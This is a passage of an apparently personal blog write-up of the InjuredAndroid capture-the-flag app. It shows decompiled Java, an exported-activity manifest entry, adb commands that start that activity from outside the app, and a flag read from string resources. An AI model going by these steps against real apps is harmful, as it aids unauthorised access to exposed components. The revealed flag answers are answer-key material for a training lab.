    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;/* synthetic */&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;m4090F&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4461w&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Snackbar X &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m2647X&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Key words Activity and exported.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m2646Y&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;mo2650N&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4461w&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;++;&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Snackbar X2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m2647X&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Exported Activities can be accessed with adb or Drozer.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m2646Y&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;mo2650N&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4461w&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#776e71&#34;&gt;/* access modifiers changed from: protected */&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;@Override&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        setContentView&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;activity_flag_two&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        m8078C&lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;Toolbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toolbar&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;FloatingActionButton&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;fab&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// from class: b3nac.injuredandroid.d
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#5bc4bf&#34;&gt;@Override&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// android.view.View.OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                FlagTwoActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4090F&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;});&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;oncreate&lt;/strong&gt; method is used for initializing our activity. The goal of the challenge is to invoke the flagtwoactivity from an external application. This activity is called &lt;strong&gt;exported activity&lt;/strong&gt;, meaning it can be started outside the context of the application.&lt;/p&gt;
&lt;p&gt;Activities in android are defined in a file called &lt;em&gt;AndroidManifest.xml&lt;/em&gt; .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;activity&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;b3nac.injuredandroid.b25lActivity&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:exported=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you see above, the activity &lt;strong&gt;b3nac.injuredandroid.b25lActivity&lt;/strong&gt; can be invoked by external application because &lt;strong&gt;android:exported&lt;/strong&gt; attribute is set to true.&lt;/p&gt;
&lt;p&gt;For exploitation of the above issue we will use adb. First we use adb to list the installed packages in the device and grep the application of our interest using Linux grep utility.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:~$ adb shell pm list packages | grep injuredandroid
package:b3nac.injuredandroid
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;What happens when invoke b25lActivity class activity?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When b25lActivity activity is invoked by an external program, it sets the flag2 color to green in the FlagsOverview activity.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#776e71&#34;&gt;/* loaded from: classes.dex */&lt;/span&gt;
&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;b25lActivity&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;extends&lt;/span&gt; ActivityC0453c &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#776e71&#34;&gt;/* access modifiers changed from: protected */&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;@Override&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        setContentView&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;activity_b25l&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4506j&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4062a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4082M&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;flagTwoButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Invoke the activity b25lActivity using adb. Other method of invoking exported activities is by creating an android application thats starts the activity of the target`s activity.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:~$ adb shell am start  -n b3nac.injuredandroid/.b25lActivity
Starting: Intent &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;cmp&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;b3nac.injuredandroid/.b25lActivity &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;when the activity two is started successfully by an external application, we are rewarded with a flag.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/androidsec/flag2.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/androidsec/flag2.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Flag two&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag two&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-three---resources&#34;&gt;FLAG THREE - RESOURCES&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal: Understanding how an application references Resources.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;what are resources?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Resources are used for anything from defining colors, images, layouts, menus and string values. Everything defined here is referenced in the application`s code.&lt;/p&gt;
&lt;p&gt;The decompiled code for FlagThreeActivity is shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;submitFlag&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        EditText editText &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;EditText&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;editText2&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;editText2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m885a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(),&lt;/span&gt; getString&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;cmVzb3VyY2VzX3lv&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Intent intent &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; FlagOneSuccess&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4083L&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;flagThreeButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            startActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the above  &lt;strong&gt;submitFlag&lt;/strong&gt; function defined in &lt;em&gt;&lt;strong&gt;FlagThreeActivity.java&lt;/strong&gt;&lt;/em&gt;, we are comparing the user input with the value referenced at Resource  &lt;em&gt;&lt;strong&gt;cmVzb3VyY2VzX3lv&lt;/strong&gt;&lt;/em&gt; . R stands for resource.&lt;/p&gt;
&lt;p&gt;Looking at the strings we get our flags as referenced by the string above.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;string &lt;span style=&#34;color:#ef6155&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;cmVzb3VyY2VzX3lv&amp;#34;&lt;/span&gt;&amp;gt;F1ag_thr33&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The  flag is  &lt;strong&gt;F1ag_thr33&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-four---login2&#34;&gt;FLAG FOUR - LOGIN2&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal: Get the right flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For flag four we analyze &lt;strong&gt;FlagFourActivity.java.&lt;/strong&gt;. First we need figure out the logic implemented in the submitflag class in the code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;submitFlag&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        EditText editText &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;EditText&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;editText2&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
